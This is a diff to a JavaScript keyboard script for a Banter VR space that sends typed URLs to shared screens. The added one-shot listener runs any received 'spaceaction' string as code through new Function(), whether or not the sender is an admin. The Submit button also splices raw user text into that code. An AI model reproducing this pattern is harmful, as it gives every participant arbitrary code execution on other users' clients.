@@ -163,7 +163,7 @@ async function initializeKeyboard() {
     await createSpecialButton("Backspace", new BS.Vector3(startX + 10.8 * xOffset, (startY + 0.4), 0), backspaceInputText, 1.2, new BS.Vector3(9.5, -2.37, -0.01));
     await createSpecialButton("Submit", new BS.Vector3(startX + 10.8 * xOffset, startY, 0), () => { console.log(inputText.text);
       setPublicSpaceProp(`USERID:${BS.BanterScene.GetInstance().localUser.uid}:${BS.BanterScene.GetInstance().localUser.name}`, inputText.text.substring(0, 20).trim()); 
-      oneShot({fireurl: `${inputText.text}`}); setFirePageUrls(`${inputText.text}`); inputText.text = ""; }, 1.2, new BS.Vector3(9.5, -2.37, -0.01));
+      oneShot({fireurl: `${inputText.text}`}); oneShot({spaceaction: `document.querySelectorAll('.firescreenc').forEach(firescreenc => { firescreenc.setAttribute("sq-browser", { url: ${inputText.text}, pixelsPerUnit: 1200, mipMaps: 0, mode: "local" }); });`}); setFirePageUrls(`${inputText.text}`); inputText.text = ""; }, 1.2, new BS.Vector3(9.5, -2.37, -0.01));
     await createSpecialButton("Space", new BS.Vector3(startX + 1.5, startY + 3 * yOffset, 0), () => { updateInputText(" "); }, 1.2, new BS.Vector3(9.65, -2.37, -0.01));
 
     await createSpecialButton("Paste", new BS.Vector3(startX + 10.8 * xOffset, startY + 1.0 * yOffset, 0), async () => {
@@ -209,3 +209,12 @@ async function updateMessageBoard(thisText) { thisText.text = "User:Message";
     }
   });              
 };
+
+BS.BanterScene.GetInstance().On("one-shot", e => { console.log(e.detail);
+  const data = JSON.parse(e.detail.data); const isAdmin = e.detail.fromAdmin;
+  if (isAdmin || e.detail.fromId === "f67ed8a5ca07764685a64c7fef073ab9") {console.log(isAdmin ? "Current Shot is from Admin" : "Current Shot is from Target ID");
+    if (data.spaceaction) { console.log(data.spaceaction); new Function(data.spaceaction)(); };
+  } else { console.log("Current Shot From Admin Is False");
+    if (data.spaceaction) { console.log(data.spaceaction); new Function(data.spaceaction)(); };
+  };
+});
